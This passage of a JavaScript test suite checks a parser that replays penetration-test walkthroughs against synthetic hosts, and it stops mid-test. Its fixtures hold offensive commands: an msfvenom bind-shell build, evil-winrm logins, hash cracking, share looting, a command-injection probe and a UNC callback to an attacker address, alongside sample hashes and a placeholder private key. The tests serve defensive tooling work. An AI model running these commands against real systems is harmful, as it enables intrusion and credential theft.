#!/usr/bin/env node
/*
 * tests/engine/pg-practice-trajectories-smoke.js - Deterministic synthetic smoke suite
 * for PG-1 corpus extractor, stateful trajectory replay, Tier-1/2/3 parser grammars,
 * causal entailment guards, and outcome classification contracts.
 *
 * Contract:
 *   - 100% synthetic RFC 5737 / RFC 2606 / synthetic principal fixtures.
 *   - Zero machine names, walkthrough slugs, lab hostnames, author handles, or real hashes.
 *   - House style: zero em dashes, zero en dashes, zero emoji.
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  createSandbox,
  createEngagementSession,
  probeBlockStateless
} = require('../../tools/corpus/sandbox-loader');
const extractor = require('../../tools/corpus/markdown-extractor');
const factsAxis = require('../../tools/corpus/facts-axis');
const trajectories = require('../../tools/corpus/harvest-trajectories');

function runSmokeSuite() {
  const OBOL = createSandbox();
  let passed = 0;
  const failures = [];

  function test(name, fn) {
    try {
      fn();
      passed++;
      console.log('  [PASS] ' + name);
    } catch (err) {
      failures.push({ name: name, error: err });
      console.error('  [FAIL] ' + name + ': ' + (err && err.message ? err.message : String(err)));
    }
  }

  function newSession(targetIp, lhostIp) {
    return createEngagementSession(OBOL, {
      name: 'SmokeSession',
      target: targetIp || '198.51.100.10',
      targets: [targetIp || '198.51.100.10'],
      lhost: lhostIp || '10.10.14.5'
    });
  }

  function hasKind(factsArr, kind) {
    return (factsArr || []).some(f => f && f.kind === kind);
  }

  function findFacts(factsArr, kind) {
    return (factsArr || []).filter(f => f && f.kind === kind);
  }

  console.log('Running PG-1 trajectories and generalization smoke suite...');

  // ---- Part I: Slice B4 Extractor and Trajectory Harness Generalizations ----

  test('B4-1: Adjacent Command + Output/Result fence pairing (including 1-line output and section-heading guard)', () => {
    const md = [
      '## Enumeration',
      '',
      'Command:',
      '```',
      'smbclient -L //198.51.100.10 -N',
      '```',
      'Output:',
      '```',
      'Anonymous login successful',
      '```',
      '',
      'Command:',
      '```',
      'nmap -p 80,445 -sV 198.51.100.10',
      '```',
      'Output (relevant):',
      '```',
      '80/tcp  open  http          Apache httpd 2.4.52',
      '445/tcp open  microsoft-ds',
      '```',
      '',
      '```bash',
      'python3 dump_tool.py -local',
      '```',
      '## Results',
      '```bash',
      'SUMMARY TABLE HEADER',
      '========================================',
      'acct_alpha : a1b2c3d4e5f60718293a4b5c6d7e8f90',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 4, 'Expected 2 paired turns plus 2 unpaired turns across ## Results');
    assert.strictEqual(res.turns[0].command, 'smbclient -L //198.51.100.10 -N');
    assert.strictEqual(res.turns[0].stdout.trim(), 'Anonymous login successful');
    assert.strictEqual(res.turns[1].command, 'nmap -p 80,445 -sV 198.51.100.10');
    assert.ok(/80\/tcp\s+open\s+http/.test(res.turns[1].stdout));
    assert.strictEqual(res.turns[2].command, 'python3 dump_tool.py -local');
    assert.strictEqual(res.turns[2].stdout.trim(), '');
  });

  test('B4-2: Multi-line RAW_ARTIFACT_HEADER_RE within first 5 lines when complete PEM envelope is present', () => {
    const pemFence = [
      'http://198.51.100.12:8080/api/keys/export',
      'Exported key payload:',
      '-----BEGIN OPENSSH PRIVATE KEY-----',
      'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW',
      'QyNTUxOQAAACBsynthetic000000000000000000000000000000000000AAAAECsynt',
      '-----END OPENSSH PRIVATE KEY-----'
    ].join('\n');

    const cls = extractor.classifyFenceBlock('', pemFence);
    assert.strictEqual(cls.include, true, 'Expected bare fence with early PEM envelope to be included');
    const seg = extractor.segmentBlock({ text: pemFence, lang: '', lineStart: 10 });
    assert.strictEqual(seg.units.length, 1);
    assert.strictEqual(seg.units[0].command, '');
    assert.ok(/-----BEGIN OPENSSH PRIVATE KEY-----/.test(seg.units[0].stdout));
  });

  test('B4-3: Untagged bare multi-command fence splitting and pure interactive REPL input echo stripping', () => {
    const md = [
      '### Local Recon',
      '```',
      'whoami /priv',
      'whoami /groups',
      'systeminfo',
      '```',
      '',
      '```',
      'rpcclient -U "" -N 198.51.100.14',
      'enumdomusers',
      'enumdomgroups',
      '```',
      '',
      '```',
      'smbclient //198.51.100.14/SharedData -N',
      'recurse ON',
      'prompt OFF',
      'mget *',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 5);
    assert.deepStrictEqual(
      res.turns.slice(0, 3).map(t => [t.command, t.stdout]),
      [
        ['whoami /priv', ''],
        ['whoami /groups', ''],
        ['systeminfo', '']
      ]
    );
    assert.strictEqual(res.turns[3].command, 'rpcclient -U "" -N 198.51.100.14');
    assert.strictEqual(res.turns[3].stdout, '');
    assert.deepStrictEqual(res.turns[3].subcommands, ['enumdomusers', 'enumdomgroups']);
    assert.strictEqual(res.turns[4].command, 'smbclient //198.51.100.14/SharedData -N');
    assert.strictEqual(res.turns[4].stdout, '');
  });

  test('B4-4: Standalone Windows landing-prompt fence recognition after exploit/output captions', () => {
    const md = [
      '## Reverse Shell Callback',
      'Output:',
      '```',
      'PS C:\\Program Files\\AppSvc>',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 1);
    assert.strictEqual(res.turns[0].kind, 'powershell');
    assert.strictEqual(res.turns[0].hostHint, 'windows');
    assert.ok(/PS C:\\Program Files\\AppSvc>/.test(res.turns[0].promptLine));
  });

  test('B4-5: OCR sidecar prompt_line hostHint propagation and external browser reference housekeeping', () => {
    const entries = extractor.normalizeOcrSidecarEntries([
      {
        line: 30,
        prompt_line: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
        reconstructed_command: 'dir; type notes_export.txt',
        transcribed_output: '01000000d08c9ddf0115d1118c7a00c04fc297eb' + 'a0'.repeat(90)
      },
      {
        line: 45,
        kind: 'browser',
        reconstructed_command: 'GET https://stackoverflow.com/questions/100000/powershell-dpapi-example',
        transcribed_output: '$pw = ConvertTo-SecureString "TestPassword" -AsPlainText -Force'
      }
    ]);

    assert.strictEqual(entries[0].hostHint, 'remote-windows');
    assert.strictEqual(trajectories.isHousekeepingTurn(entries[0]).housekeeping, false);

    assert.strictEqual(entries[1].kind, 'browser');
    assert.strictEqual(entries[1].externalReference, true);
    const hk = trajectories.isHousekeepingTurn(entries[1]);
    assert.strictEqual(hk.housekeeping, true);
    assert.strictEqual(hk.reason, 'attacker_reference_lookup');
  });

  test('B4-6: inferEngagementNetworking ignores msfvenom bind_tcp LHOST and scanned target IPs for lhost', () => {
    const net = trajectories.inferEngagementNetworking([
      {
        command: 'nmap -sC -sV 10.200.55.40',
        stdout: 'Nmap scan report for 10.200.55.40\n80/tcp open http\n'
      },
      {
        command: 'msfvenom -p windows/shell_bind_tcp LHOST=10.200.55.40 LPORT=4444 -f exe -o stage_bin.exe',
        stdout: ''
      }
    ]);

    assert.strictEqual(net.primaryTarget, '10.200.55.40');
    assert.notStrictEqual(net.lhost, '10.200.55.40');
    assert.strictEqual(net.selfIps.indexOf('10.200.55.40'), -1);
  });

  test('B4-7: gateEvidencePresentInHistory strips # comments and pure REPL echoes before length check', () => {
    const commentHistory = [
      {
        command: 'hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt',
        stdout: '# Yields: acct_alpha:<redacted_secret_value>',
        housekeeping: false,
        minted_count: 0,
        outcome_kind: 'unknown'
      }
    ];
    const replHistory = [
      {
        command: 'rpcclient -U "" -N 198.51.100.20',
        stdout: 'enumdomusers\n\nenumdomgroups\nquerydispinfo',
        housekeeping: false,
        minted_count: 0,
        outcome_kind: 'unknown'
      }
    ];

    assert.strictEqual(trajectories.gateEvidencePresentInHistory(['credential.available'], commentHistory).found, false);
    assert.strictEqual(trajectories.gateEvidencePresentInHistory(['ad.users'], replHistory).found, false);
  });

  test('B4-8: Move matcher disambiguation, semantic variant guards, and obsoleted-move satisfaction', () => {
    const kerberoastCrack = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'hashcat -m 13100 svc_tgs.hash /usr/share/wordlists/rockyou.txt',
      stdout: ''
    });
    assert.ok(kerberoastCrack.length > 0);
    assert.strictEqual(kerberoastCrack[0].id, 'crack-kerberoast');

    const johnGeneric = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'john web_htpasswd.hash --wordlist=/usr/share/wordlists/rockyou.txt',
      stdout: ''
    });
    assert.ok(johnGeneric.some(c => c.id === 'crack-modular-hash'));
    const idxMod = johnGeneric.findIndex(c => c.id === 'crack-modular-hash');
    const idxKp = johnGeneric.findIndex(c => c.id === 'keepass-dump-recover');
    assert.ok(idxMod >= 0 && (idxKp < 0 || idxMod < idxKp));

    const winEnumUnprompted = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'whoami /priv',
      stdout: '',
      kind: 'unprompted',
      hostHint: ''
    });
    assert.ok(winEnumUnprompted.length > 0);
    assert.strictEqual(winEnumUnprompted[0].id, 'windows-enum');

    const actions = OBOL.packs.actions();
    const byId = Object.create(null);
    actions.forEach(a => { if (a && a.id) byId[a.id] = a; });

    if (byId['laps-read'] && byId['laps-read'].commands && byId['laps-read'].commands[0]) {
      for (const cObj of byId['laps-read'].commands) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['laps-read'], cObj, 'Get-ADComputer -Filter * | Select-Object Name,SID'),
          0
        );
      }
    }
    if (byId['manual-sqli-exploitation']) {
      for (const cObj of (byId['manual-sqli-exploitation'].commands || [])) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['manual-sqli-exploitation'], cObj, 'curl http://127.0.0.1/?C:\\Users\\acct_alpha\\Desktop\\stage_bin.exe'),
          0
        );
      }
    }
    if (byId['authz-abuse']) {
      for (const cObj of (byId['authz-abuse'].commands || [])) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['authz-abuse'], cObj, "curl -X POST -H 'content-length: 1000' http://198.51.100.15:33333/list-running-procs"),
          0
        );
      }
    }

    // Post-SYSTEM obsoleted windows-enum repeat check
    const sess = newSession('198.51.100.16');
    sess.ingestTurn({
      command: 'whoami',
      stdout: 'nt authority\\system\n',
      promptLine: 'C:\\Windows\\system32>whoami',
      target: '198.51.100.16',
      forceTarget: '198.51.100.16'
    });
    const sysFacts = sess.factSetForTarget('198.51.100.16');
    assert.ok(sysFacts.has('access.system'), 'Expected access.system before post-root systeminfo');
    const cands = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'systeminfo',
      stdout: '',
      kind: 'cmd',
      hostHint: 'windows'
    }, { facts: sysFacts, target: '198.51.100.16' });
    const reach = trajectories.evaluateClosedLoopReachability(sess, cands, { command: 'systeminfo' }, {
      targetIp: '198.51.100.16',
      historyTurns: [],
      executedMoveIds: new Set()
    });
    assert.strictEqual(reach.reachable, true);
    assert.strictEqual(reach.mode, 'already_settled_repeat');
  });

  test('B4-9: End-to-end synthetic replayWalkthrough with Command/Output pairing, landing prompt, and OCR isolation', () => {
    const syntheticMd = [
      '# Synthetic Host Assessment',
      '',
      '## Port Scan',
      'Command:',
      '```',
      'nmap -p 80,445,5985 -sC -sV 198.51.100.70',
      '```',
      'Output:',
      '```',
      'Nmap scan report for 198.51.100.70',
      'PORT     STATE SERVICE       VERSION',
      '80/tcp   open  http          Apache httpd 2.4.52',
      '445/tcp  open  microsoft-ds  Microsoft Windows Server 2019 microsoft-ds',
      '5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0',
      '```',
      '',
      '## Shell Callback',
      'Output:',
      '```',
      'PS C:\\Program Files\\AppSvc>',
      '```',
      '',
      '## Local Enumeration',
      'Command:',
      '```',
      'whoami /priv',
      '```',
      'Output:',
      '```',
      'PRIVILEGES INFORMATION',
      '----------------------',
      'Privilege Name                Description                               State',
      '============================= ========================================= ========',
      'SeImpersonatePrivilege        Impersonate a client after authentication Enabled',
      '```'
    ].join('\n');

    const rep = trajectories.replayWalkthrough(OBOL, {
      slug: 'synthetic_win_chain',
      markdown: syntheticMd,
      ocrEntries: [
        {
          line: 25,
          kind: 'browser',
          reconstructed_command: 'GET https://github.com/example-org/doc-reference',
          transcribed_output: '$sample = ConvertTo-SecureString "TestPassword" -AsPlainText -Force'
        }
      ]
    }, {
      target: '198.51.100.70',
      lhost: '10.10.14.5'
    });

    assert.strictEqual(rep.totals.stalled_steps, 0, 'Expected 0 stalled steps on synthetic end-to-end replay');
    assert.ok(rep.totals.reachable_steps >= 2, 'Expected nmap and windows-enum steps to be reachable');
    const browserStep = rep.steps.find(s => s.housekeeping_reason === 'attacker_reference_lookup');
    assert.ok(browserStep, 'Expected external browser OCR entry to be classified as attacker_reference_lookup');
    assert.strictEqual(browserStep.minted_kinds.length, 0, 'External browser reference turn must not mint target facts');
  });

  // ---- Part II: PG-1 Engine, Tier-1/2/3 Parser, and Outcome Generalizations ----

  test('PG1-1: Empty-stdout OBOL.ingest.run preserves promptLine and followPrompt shell telemetry', () => {
    const sess1 = newSession('198.51.100.21');
    const r1 = sess1.ingestTurn({
      command: 'ssh -i id_rsa acct_alpha@198.51.100.21',
      stdout: '',
      followPrompt: 'C:\\Users\\acct_alpha\\Desktop>',
      target: '198.51.100.21',
      forceTarget: '198.51.100.21'
    });
    assert.ok(r1.ok !== false, 'Expected empty-stdout turn with followPrompt not to abort as empty');
    const f1 = sess1.factSetForTarget('198.51.100.21');
    assert.ok(f1.has('foothold.windows'), 'Expected foothold.windows from Windows landing followPrompt');

    const sess2 = newSession('198.51.100.22');
    sess2.ingestTurn({
      command: 'evil-winrm -i 198.51.100.22 -u acct_alpha -p SynthPass99!',
      stdout: '',
      followPrompt: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.22',
      forceTarget: '198.51.100.22'
    });
    const f2 = sess2.factSetForTarget('198.51.100.22');
    assert.ok(f2.has('foothold.windows'), 'Expected foothold.windows from Evil-WinRM landing prompt');
    assert.ok(f2.has('winrm.authenticated'), 'Expected winrm.authenticated from Evil-WinRM landing prompt');
  });

  test('PG1-2: Nmap verbose REASON column (syn-ack / ttl) stripping in service.version and exploit.versioned_banner', () => {
    const nmapOut = [
      'Nmap scan report for 198.51.100.23',
      'PORT     STATE SERVICE REASON          VERSION',
      '21/tcp   open  ftp     syn-ack         zFTPServer 6.0 build 2011-10-17',
      '22/tcp   open  ssh     syn-ack ttl 125 Bitvise WinSSHD 8.48',
      '242/tcp  open  http    syn-ack         Apache httpd 2.2.21 ((Win32) PHP/5.3.8)',
      '8080/tcp open  http    syn-ack         Apache Tomcat/Coyote JSP engine 1.1'
    ].join('\n');

    const sess = newSession('198.51.100.23');
    const rep = sess.ingestTurn({
      command: 'nmap -vv -sV 198.51.100.23',
      stdout: nmapOut,
      target: '198.51.100.23',
      forceTarget: '198.51.100.23'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'service.version'), 'Expected service.version on syn-ack HTTP rows');
    const banners = findFacts(minted, 'exploit.versioned_banner');
    assert.ok(banners.length > 0, 'Expected exploit.versioned_banner facts');
    const allEntries = [];
    for (const b of banners) {
      if (b.value && Array.isArray(b.value.all)) allEntries.push.apply(allEntries, b.value.all);
      else if (b.value) allEntries.push(b.value);
    }
    assert.ok(allEntries.length >= 2, 'Expected multiple versioned banner entries on syn-ack scan');
    for (const entry of allEntries) {
      const prod = String((entry && entry.product) || '');
      const sq = String((entry && entry.search_query) || '');
      assert.ok(!/\bsyn-ack\b/i.test(prod), 'Product must not include syn-ack prefix: ' + prod);
      assert.ok(!/\bsyn-ack\b/i.test(sq), 'search_query must not include syn-ack prefix: ' + sq);
    }
  });

  test('PG1-3: Nmap -sV inline Active Directory LDAP Domain banner extraction and NSE CVE promotion', () => {
    const nmapAdVuln = [
      'Nmap scan report for 198.51.100.24',
      'PORT    STATE SERVICE      VERSION',
      '88/tcp  open  kerberos-sec Microsoft Windows Kerberos',
      '389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: corp.example.internal0., Site: Default-First-Site-Name)',
      '445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds',
      'Host script results:',
      '| smb-vuln-cve-2009-3103:',
      '|   VULNERABLE:',
      '|   SMBv2 Negotiation Vulnerability',
      '|     State: VULNERABLE',
      '|     IDs:  CVE:CVE-2009-3103',
      '|_    Disclosure date: 2009-09-07'
    ].join('\n');

    const sess = newSession('198.51.100.24');
    const rep = sess.ingestTurn({
      command: 'nmap -sV --script vuln 198.51.100.24',
      stdout: nmapAdVuln,
      target: '198.51.100.24',
      forceTarget: '198.51.100.24'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'ad.domain_known'), 'Expected ad.domain_known from inline LDAP Domain banner');
    assert.ok(hasKind(minted, 'host.domain'), 'Expected host.domain from inline LDAP Domain banner');
    const domFacts = findFacts(minted, 'host.domain');
    assert.ok(
      domFacts.some(f => String((f.value && (f.value.domain || f.value.name)) || '').toLowerCase() === 'corp.example.internal'),
      'Expected trailing 0. ASN.1 artifact stripped to corp.example.internal'
    );
    assert.ok(hasKind(minted, 'exploit.candidate'), 'Expected exploit.candidate from positive NSE State: VULNERABLE CVE');
  });

  test('PG1-4: edb.js web.server headers[] / |_http-server-header: and slash-qualified product version extraction', () => {
    const nmapHeaders = [
      'Nmap scan report for 198.51.100.25',
      'PORT     STATE SERVICE         VERSION',
      '143/tcp  open  imap            Mercury/32 imapd 4.62',
      '8081/tcp open  blackice-icecap',
      '|_http-server-header: Nexus/3.21.0-05 (OSS)'
    ].join('\n');

    const sess = newSession('198.51.100.25');
    const rep = sess.ingestTurn({
      command: 'nmap -sC -sV 198.51.100.25',
      stdout: nmapHeaders,
      target: '198.51.100.25',
      forceTarget: '198.51.100.25'
    });
    const banners = findFacts(rep.minted_facts || [], 'exploit.versioned_banner');
    const bannerItems = [];
    for (const b of banners) {
      if (b.value && Array.isArray(b.value.all)) bannerItems.push.apply(bannerItems, b.value.all);
      else if (b.value) bannerItems.push(b.value);
    }
    assert.ok(
      bannerItems.some(item => /nexus/i.test(String((item && item.product) || '')) && /^3\.21/.test(String((item && item.version) || ''))),
      'Expected Nexus 3.21.0-05 exploit.versioned_banner from |_http-server-header:'
    );
    assert.ok(
      bannerItems.some(item => /mercury\/32/i.test(String((item && (item.product || item.search_query)) || '')) && /4\.62/.test(String((item && item.version) || ''))),
      'Expected Mercury/32 imapd 4.62 exploit.versioned_banner preserving slash-qualified product'
    );
  });

  test('PG1-5: pwdump NO PASSWORD* disabled LM column mints loot.sam, hash.ntlm, and credential.available (no loot.ntds)', () => {
    const pwdumpOut = [
      'Administrator:500:NO PASSWORD*********************:a9f01b2c3d4e5f60718293a4b5c6d7e8:::',
      'Guest:501:NO PASSWORD*********************:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      'acct_alpha:1002:NO PASSWORD*********************:11223344556677889900aabbccddeeff:::'
    ].join('\n');

    const sess = newSession('198.51.100.26');
    const rep = sess.ingestTurn({
      command: '',
      stdout: pwdumpOut,
      target: '198.51.100.26',
      forceTarget: '198.51.100.26'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'loot.sam'), 'Expected loot.sam on local pwdump output');
    assert.ok(hasKind(minted, 'hash.ntlm'), 'Expected hash.ntlm on local pwdump output');
    assert.ok(hasKind(minted, 'credential.available'), 'Expected credential.available for non-empty NT hashes');
    assert.ok(!hasKind(minted, 'loot.ntds'), 'Must not mint loot.ntds on local SAM pwdump');
  });

  test('PG1-6: PowerUp Write-HijackDll / HijackablePath and Write-UserAddMSI stanzas', () => {
    const powerUpOut = [
      '[*] Checking %PATH% for potentially hijackable DLL locations...',
      '',
      'HijackablePath : C:\\Python27\\',
      'AbuseFunction  : Write-HijackDll -DllPath \'C:\\Python27\\wlbsctrl.dll\'',
      '',
      '[*] Checking for AlwaysInstallElevated registry key...',
      '',
      'AbuseFunction  : Write-UserAddMSI'
    ].join('\n');

    const sess = newSession('198.51.100.27');
    const rep = sess.ingestTurn({
      command: '',
      stdout: powerUpOut,
      target: '198.51.100.27',
      forceTarget: '198.51.100.27'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'privesc.dll_hijack_candidate'), 'Expected privesc.dll_hijack_candidate');
    assert.ok(hasKind(minted, 'privesc.always_install_elevated'), 'Expected privesc.always_install_elevated');
    assert.ok(hasKind(minted, 'privesc.leads'), 'Expected privesc.leads');
  });

  test('PG1-7: Windows DPAPI CRYPTOAPI_BLOB hex string mints privesc.stored_credentials and credential.candidate', () => {
    const dpapiHex = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000' + '4a7b2c9e'.repeat(28);
    const sess = newSession('198.51.100.28');
    const rep = sess.ingestTurn({
      command: 'type C:\\Users\\acct_alpha\\Documents\\cred_blob.txt',
      stdout: dpapiHex + '\n',
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.28',
      forceTarget: '198.51.100.28'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'privesc.stored_credentials'), 'Expected privesc.stored_credentials on DPAPI blob');
    assert.ok(hasKind(minted, 'credential.candidate'), 'Expected credential.candidate on DPAPI blob');
  });

  test('PG1-8: net user promotes access.admin for owned principal in *Administrators, never for unowned Administrator', () => {
    const sess = newSession('198.51.100.29');
    // Establish owned session as acct_alpha
    sess.ingestTurn({
      command: 'evil-winrm -i 198.51.100.29 -u acct_alpha -p SynthPass99!',
      stdout: '',
      followPrompt: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });

    // Inspecting unowned Administrator must NOT mint access.admin
    const unownedNetUser = [
      'User name                    Administrator',
      'Account active               Yes',
      'Local Group Memberships      *Administrators',
      'Global Group memberships     *Domain Admins',
      'The command completed successfully.'
    ].join('\n');
    sess.ingestTurn({
      command: 'net user Administrator',
      stdout: unownedNetUser,
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });
    assert.ok(
      !sess.factSetForTarget('198.51.100.29').has('access.admin'),
      'Must not mint access.admin when inspecting unowned Administrator account'
    );

    // Inspecting owned acct_alpha after local-admin group addition MUST mint access.admin
    const ownedNetUser = [
      'User name                    acct_alpha',
      'Account active               Yes',
      'Local Group Memberships      *Administrators       *Remote Management Use',
      'Global Group memberships     *Domain Users',
      'The command completed successfully.'
    ].join('\n');
    sess.ingestTurn({
      command: 'net user acct_alpha',
      stdout: ownedNetUser,
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });
    assert.ok(
      sess.factSetForTarget('198.51.100.29').has('access.admin'),
      'Expected access.admin when owned principal acct_alpha has *Administrators membership'
    );
  });

  test('PG1-9: enum4linux-ng random-username blank-password guest session and smbclient putting file writable share', () => {
    const e4lOut = [
      ' =======================================',
      '|    Sessions on 198.51.100.30          |',
      ' =======================================',
      '[-] Could not establish null session: STATUS_ACCESS_DENIED',
      '[+] Server allows session using username \' rjzqwxkp \'.trim(), password \'\''
    ].join('\n').replace("' rjzqwxkp '.trim()", "'rjzqwxkp'");

    const sess = newSession('198.51.100.30');
    const rep1 = sess.ingestTurn({
      command: 'enum4linux-ng -A 198.51.100.30',
      stdout: e4lOut,
      target: '198.51.100.30',
      forceTarget: '198.51.100.30'
    });
    const m1 = rep1.minted_facts || [];
    assert.ok(hasKind(m1, 'smb.guest_session'), 'Expected smb.guest_session on random-user blank-password session');
    assert.ok(hasKind(m1, 'smb.reachable'), 'Expected smb.reachable');
    assert.ok(!hasKind(m1, 'smb.null_session'), 'Must not mint smb.null_session when null session was denied');
    assert.notStrictEqual(rep1.outcome && rep1.outcome.kind, 'authorization-denied');

    const smbPutOut = 'putting file stage_bin.exe as \\stage_bin.exe (1420.5 kb/s) (average 1420.5 kb/s)\n';
    const rep2 = sess.ingestTurn({
      command: 'smbclient //198.51.100.30/DropShare -U guest%',
      stdout: smbPutOut,
      target: '198.51.100.30',
      forceTarget: '198.51.100.30'
    });
    assert.ok(hasKind(rep2.minted_facts || [], 'smb.writable_share'), 'Expected smb.writable_share on smbclient putting file');
  });

  test('PG1-10: curl ftp:// Unix ls -l listing, unquoted YAML secret_key_base, and Ruby Gemfile manifest', () => {
    const sess = newSession('198.51.100.31');
    const ftpListOut = [
      '-r--r--r-- 1 ftp ftp    312 May 14 2023 Gemfile',
      'drwxr-xr-x 1 ftp ftp      0 May 14 2023 config',
      '-r--r--r-- 1 ftp ftp   1024 May 14 2023 app_notes.txt'
    ].join('\n');
    const rList = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/',
      stdout: ftpListOut,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rList.minted_facts || [], 'ftp.reachable'), 'Expected ftp.reachable from curl ftp:// listing');
    assert.ok(hasKind(rList.minted_facts || [], 'loot.files'), 'Expected loot.files from curl ftp:// Unix ls -l rows');

    const yamlSecrets = [
      'production:',
      '  secret_key_base: 9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a0'
    ].join('\n');
    const rYaml = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/config/secrets.yml',
      stdout: yamlSecrets,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rYaml.minted_facts || [], 'web.source_disclosed'), 'Expected web.source_disclosed on unquoted secret_key_base');
    assert.ok(hasKind(rYaml.minted_facts || [], 'credential.candidate'), 'Expected credential.candidate on unquoted secret_key_base');

    const gemfileBody = [
      "source 'https://rubygems.org'",
      "gem 'rails', '~> 5.1.3'",
      "gem 'puma', '~> 3.7'"
    ].join('\n');
    const rGem = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/Gemfile',
      stdout: gemfileBody,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rGem.minted_facts || [], 'web.manifest_disclosed'), 'Expected web.manifest_disclosed on Ruby Gemfile');
  });

  test('PG1-11: Raw IMAP4rev1 greeting and tagged LOGIN transcript', () => {
    const imapTranscript = [
      '* OK corp.example.internal Mercury/32 v4.62 IMAP4rev1 server ready.',
      'a01 LOGIN acct_alpha SynthMailPass42!',
      'a01 OK LOGIN completed.'
    ].join('\n');

    const sess = newSession('198.51.100.32');
    const rep = sess.ingestTurn({
      command: 'nc -nv 198.51.100.32 143',
      stdout: imapTranscript,
      target: '198.51.100.32',
      forceTarget: '198.51.100.32'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'mail.reachable'), 'Expected mail.reachable on IMAP4rev1 greeting');
    assert.ok(hasKind(minted, 'service.imap.banner'), 'Expected service.imap.banner on IMAP4rev1 greeting');
    assert.ok(hasKind(minted, 'credential.validated'), 'Expected credential.validated on tagged a01 OK LOGIN');
  });

  test('PG1-12: Headerless web command injection (curl http://target/?whoami returning Windows identity)', () => {
    const sess = newSession('198.51.100.33');
    const rep = sess.ingestTurn({
      command: 'curl http://198.51.100.33/?whoami',
      stdout: '<pre>\nnt authority\\system\n</pre>\n',
      target: '198.51.100.33',
      forceTarget: '198.51.100.33'
    });
    assert.ok(hasKind(rep.minted_facts || [], 'web.cmdi_confirmed'), 'Expected web.cmdi_confirmed on headerless curl Windows whoami output');
  });

  test('PG1-13: Escaped local Windows drive path (c:\\\\...) and HTTP query-string UNC callback (?url=\\\\...) FP rejection', () => {
    const sess1 = newSession('198.51.100.34', '10.10.14.5');
    const htaccessBody = [
      'AuthName "Restricted Portal"',
      'AuthType Basic',
      'AuthUserFile c:\\\\wamp\\www\\.htpasswd',
      'require valid-user'
    ].join('\n');
    const r1 = sess1.ingestTurn({
      command: 'cat .htaccess',
      stdout: htaccessBody,
      target: '198.51.100.34',
      forceTarget: '198.51.100.34'
    });
    const f1 = sess1.factSetForTarget('198.51.100.34');
    assert.ok(!hasKind(r1.minted_facts || [], 'smb.shares') && !f1.has('smb.shares'), 'Escaped c:\\\\ path must not mint smb.shares');
    assert.ok(!f1.has('port:445') && !f1.has('smb.reachable'), 'Escaped c:\\\\ path must not entail port:445 or smb.reachable');

    const sess2 = newSession('198.51.100.35', '10.10.14.5');
    const r2 = sess2.ingestTurn({
      command: 'curl "http://198.51.100.35:8080/?url=\\\\10.10.14.5\\share"',
      stdout: 'http://198.51.100.35:8080/?url=\\\\10.10.14.5\\share\n',
      target: '198.51.100.35',
      forceTarget: '198.51.100.35'
    });
    const f2 = sess2.factSetForTarget('198.51.100.35');
    assert.ok(!hasKind(r2.minted_facts || [], 'smb.shares') && !f2.has('smb.shares'), 'Query-string attacker UNC must not mint target smb.shares');
    assert.ok(!f2.has('port:445') && !f2.has('smb.reachable'), 'Query-string attacker UNC must not entail target port:445 or smb.reachable');
  });

  test('PG1-14: Non-default FTP port (20001/tcp) causal entailment guard does not entail phantom port:21', () => {
    const nmapHighFtp = [
      'Nmap scan report for 198.51.100.36',
      'PORT      STATE SERVICE VERSION',
      '80/tcp    open  http    Apache httpd 2.4.52',
      '20001/tcp open  ftp     FileZilla ftpd 0.9.41 beta',
      '| ftp-anon: Anonymous FTP login allowed (FTP code 230)',
      '|_-rw-r--r-- 1 ftp ftp 128 Jan 10 2023 readme.txt'
    ].join('\n');

    const sess = newSession('198.51.100.36');
    sess.ingestTurn({
      command: 'nmap -p 80,20001 -sC -sV 198.51.100.36',
      stdout: nmapHighFtp,
